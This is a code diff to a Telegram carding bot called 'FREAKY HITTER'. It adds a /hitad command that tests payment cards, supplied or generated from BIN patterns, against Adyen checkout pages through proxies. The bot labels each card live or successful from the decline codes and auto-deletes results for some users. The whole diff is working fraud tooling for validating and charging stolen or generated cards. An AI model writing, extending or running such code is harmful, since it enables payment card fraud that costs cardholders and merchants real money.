@@ -87,44 +87,6 @@ bot = Bot(
 )
 
 # Global store for active sessions
-STANDARD_DECLINE_MAP = {
-    'generic_decline': 'Card Declined',
-    'card_declined': 'Card Declined',
-    'transaction_not_allowed': 'Card Declined',
-    'do_not_honor': 'Do Not Honor',
-    'insufficient_funds': 'Insufficient Funds',
-    'incorrect_cvv': 'Incorrect CVV',
-    'invalid_cvc': 'Invalid CVC',
-    'incorrect_number': 'Incorrect Card Number',
-    'invalid_number': 'Invalid Card Number',
-    'expired_card': 'Expired Card',
-    'invalid_expiry_year': 'Invalid Expiry Year',
-    'invalid_expiry_month': 'Invalid Expiry Month',
-    'stolen_card': 'Stolen Card',
-    'lost_card': 'Lost Card',
-    'pickup_card': 'Pickup Card',
-    'restricted_card': 'Restricted Card',
-    'card_not_supported': 'Card Not Supported',
-    'currency_not_supported': 'Currency Not Supported',
-    'card_velocity_exceeded': 'Card Velocity Exceeded',
-    'withdrawal_count_limit_exceeded': 'Withdrawal Limit Exceeded',
-    'authentication_required': '3DS Required',
-    'challenge_required': '3DS Challenge Required',
-    'stripe_captcha': 'Stripe Captcha',
-    'parameter_unknown': 'Parameter Unknown',
-    'incorrect_zip': 'Incorrect Zip',
-    'fraudulent': 'Fraudulent Transaction',
-    'merchant_blacklist': 'Merchant Blacklist',
-    'processing_error': 'Processing Error',
-    'try_again_later': 'Try Again Later',
-}
-
-def get_standard_reason(raw_code):
-    clean_code = str(raw_code or '').strip().lower()
-    if clean_code in STANDARD_DECLINE_MAP:
-        return STANDARD_DECLINE_MAP[clean_code]
-    return clean_code.replace('_', ' ').title() if clean_code else 'Card Declined'
-
 active_sessions = {}
 db_pool = None
 approved_users_set = set()
@@ -154,7 +116,9 @@ async def cmds_command(message: types.Message) -> None:
         "⚡ <b>FREAKY HITTER COMMANDS</b> ⚡\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "💳 <b>/hit</b> <code>[url] [cc\|mm\|yy\|cvc]</code>\n"
-        "└ <i>Hits a single card against target checkout.</i>\n\n"
+        "└ <i>Hits a single card against Stripe checkout.</i>\n\n"
+        "💎 <b>/hitad</b> <code>[url] [cc\|mm\|yy\|cvc]</code>\n"
+        "└ <i>Hits cards against Adyen gateway checkout.</i>\n\n"
         "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
         "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
         "🌐 <b>/proxy</b> <code>[ip:port:user:pass]</code>\n"
@@ -419,8 +383,7 @@ async def hit_command(message: types.Message):
                 else:
                     code_escaped = str(code)
                     
-                display_reason = get_standard_reason(code_escaped)
-                log_entry = f"❌ <code>{card_str}</code> | {amt_val} | {display_reason} | {res['response_time']:.2f}s"
+                log_entry = f"❌ <code>{card_str}</code> | {amt_val} | {code_escaped.lower()} | {res['response_time']:.2f}s"
                 
                 # Live Card Detection
                 live_codes = [
@@ -437,7 +400,7 @@ async def hit_command(message: types.Message):
                     f"💳 <code>{card_str}</code>\n"
                     f"💰 Amount: {amt_val}\n"
                     f"🛒 Merchant: {merchant_name}\n"
-                    f"📉 Reason: {display_reason}\n"
+                    f"📉 Reason: {code_escaped.lower()}\n"
                     f"⏱ {res['response_time']:.2f}s"
                 )
                 
@@ -680,6 +643,129 @@ async def hit_command(message: types.Message):
     
     # Run the hitter asynchronously without blocking the bot dispatcher
     asyncio.create_task(hitter.run())
+
+@dp.message(Command("hitad"))
+async def hitad_command(message: types.Message):
+    user_id = message.from_user.id
+    
+    if user_id in active_sessions:
+        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
+        return
+
+    # Naked IP Block
+    if not await ProxyManager.has_proxies(user_id):
+        await message.answer("<b>Error</b>\n<code>Proxy pool is empty. Please set a proxy first: /proxy ip:port:user:pass</code>")
+        return
+
+    raw_tokens = message.text.strip().split()
+    if len(raw_tokens) < 3:
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [bin_pattern] [count]\nOR\n/hitad [url] [card|month|year|cvv]</code>")
+        return
+        
+    url = raw_tokens[1]
+    payload_tokens = raw_tokens[2:]
+    raw_payload = " ".join(payload_tokens)
+    cards = []
+    
+    parts = payload_tokens
+    count_val = parts[-1] if parts else ''
+    
+    if count_val.isdigit() and len(count_val) <= 3:
+        bin_pattern = "".join(parts[:-1]).strip()
+        count = int(count_val)
+        if count > 10:
+            await message.answer("<b>Error</b>\n<code>Maximum batch limit is 10 concurrent requests.</code>")
+            return
+            
+        for _ in range(count):
+            card = CardGenerator.generate(bin_pattern)
+            if card:
+                cards.append(card)
+                
+        if not cards:
+            await message.answer("<b>Error</b>\n<code>BIN pattern generation failed.</code>")
+            return
+    else:
+        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
+        clean_cc = clean_cc.replace('/', '|')
+        cc_parts = [p for p in clean_cc.split('|') if p]
+        
+        if len(cc_parts) != 4:
+            await message.answer("<b>Error</b>\n<code>Invalid card formatting. Expected: number|mm|yy|cvv</code>")
+            return
+            
+        cards.append({
+            'card': cc_parts[0],
+            'month': cc_parts[1].zfill(2),
+            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
+            'cvv': cc_parts[3]
+        })
+        
+    if len(cards) > 10:
+        await message.answer(f"<b>Error</b>\n<code>Submission of {len(cards)} cards rejected. Max concurrent limit: 10.</code>")
+        return
+
+    status_msg = await message.answer("⏳ <b>Initializing Adyen Engine...</b>")
+    active_sessions[user_id] = True
+    
+    try:
+        from adyen_hitter import AdyenAPIHitter
+        proxy_data = await ProxyManager.get_random(user_id)
+        adyen_engine = AdyenAPIHitter(url, proxy_data=proxy_data)
+        
+        results = []
+        for idx, card in enumerate(cards, 1):
+            if user_id not in active_sessions:
+                break
+            res = await adyen_engine.hit(card, idx, user_id)
+            results.append(res)
+            
+        if status_msg:
+            try: await status_msg.delete()
+            except: pass
+            
+        is_approved = user_id in approved_users_set
+        for res in results:
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant', 'Adyen Merchant')
+            time_str = f"{res.get('response_time', 0):.2f}s"
+            
+            if res['success']:
+                receipt_url = res.get('receipt_url')
+                receipt_line = f"\n🧾 <b>Receipt:</b> <a href='{receipt_url}'>{receipt_url}</a>" if receipt_url else ""
+                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+                hit_text = (
+                    f"✅ <b>PAYMENT SUCCESSFUL [ADYEN]</b>\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"🛒 Merchant: {merchant_name}\n"
+                    f"⏱ {time_str}"
+                    f"{receipt_line}" + note_line
+                )
+            else:
+                reason = res.get('error') or res.get('decline_code') or 'refused'
+                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', '3ds_required', 'challenge_required']
+                is_live = any(c in str(reason).lower() for c in live_codes)
+                status_title = "🟢 <b>CARD LIVE [ADYEN]</b>" if is_live else "❌ <b>PAYMENT UNSUCCESSFUL [ADYEN]</b>"
+                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+                hit_text = (
+                    f"{status_title}\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"🛒 Merchant: {merchant_name}\n"
+                    f"📉 Reason: {reason}\n"
+                    f"⏱ {time_str}" + note_line
+                )
+                
+            sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
+            if not is_approved:
+                async def auto_del_ad(m):
+                    await asyncio.sleep(30)
+                    try: await m.delete()
+                    except: pass
+                asyncio.create_task(auto_del_ad(sent_msg))
+                
+    finally:
+        if user_id in active_sessions:
+            del active_sessions[user_id]
 
 @dp.message(Command("stop"))
 async def stop_command(message: types.Message):
